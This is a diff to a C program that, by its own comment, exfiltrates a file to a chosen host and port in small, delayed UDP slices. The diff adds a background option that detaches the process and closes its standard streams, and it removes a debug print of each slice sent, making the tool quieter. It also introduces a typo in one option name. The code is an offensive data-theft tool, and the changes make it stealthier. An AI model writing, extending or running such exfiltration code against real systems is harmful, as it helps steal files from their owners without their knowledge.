@@ -2,6 +2,7 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/stat.h>
 #include <time.h>
 #include <unistd.h>
 
@@ -28,6 +29,7 @@ int main(int argc, char** argv) {
     int delay        = 1;
     const char* path = 0;
     const char* host = 0;
+    int background   = 0;
     int choice;
 
     while (1) {
@@ -35,16 +37,17 @@ int main(int argc, char** argv) {
 
 #ifndef NDEBUG
 #define OPTSTR "vtp:f:h:d:"
-        static struct option long_options[] = {{"version", no_argument, 0, 'v'},
-            {"test", no_argument, 0, 't'}, {"file", required_argument, 0, 'f'},
-            {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
-            {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
-#else
-#define OPTSTR "vp:f:h:d:"
         static struct option long_options[]
-            = {{"version", no_argument, 0, 'v'}, {"file", required_argument, 0, 'f'},
+            = {{"vbersion", no_argument, 0, 'v'}, {"background", no_argument, 0, 'b'},
+                {"test", no_argument, 0, 't'}, {"file", required_argument, 0, 'f'},
                 {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
                 {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
+#else
+#define OPTSTR "vbp:f:h:d:"
+        static struct option long_options[] = {{"version", no_argument, 0, 'v'},
+            {"file", required_argument, 0, 'f'}, {"background", no_argument, 0, 'b'},
+            {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
+            {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
 #endif
 
         choice = getopt_long(argc, argv, OPTSTR, long_options, &option_index);
@@ -53,6 +56,9 @@ int main(int argc, char** argv) {
         switch (choice) {
             case 'v':
                 puts("v0.1");
+                return EXIT_SUCCESS;
+            case 'b':
+                background = 1;
                 break;
             case 'd':
                 delay = atoi(optarg);
@@ -81,6 +87,26 @@ int main(int argc, char** argv) {
     if (!host || !path || !port) {
         print_help();
         return EXIT_FAILURE;
+    }
+
+    if (background) {
+        int ret;
+        if ((ret = fork()) != 0) { //>0 its good <0 its bad but we cant do anything about it
+            exit(0);
+        }
+        umask(0);
+        fclose(stdin);
+        fclose(stdout);
+        fclose(stderr);
+
+        if (setsid() < 0) {
+            perror("setsid()");
+            return EXIT_FAILURE;
+        }
+        if (chdir("/") < 0) {
+            perror("chdir()");
+            return EXIT_FAILURE;
+        }
     }
 
     //exfil the file
@@ -120,7 +146,6 @@ int main(int argc, char** argv) {
         uint8_t slice[2];
         while (!encoder_finished(&enc)) {
             encoder_get_next(&enc, slice);
-            printf("%0X %0X\n", slice[0], slice[1]);
             insert_udp_slice(sfd, &storage, slice);
             nanosleep(&ns, &rs);
         }
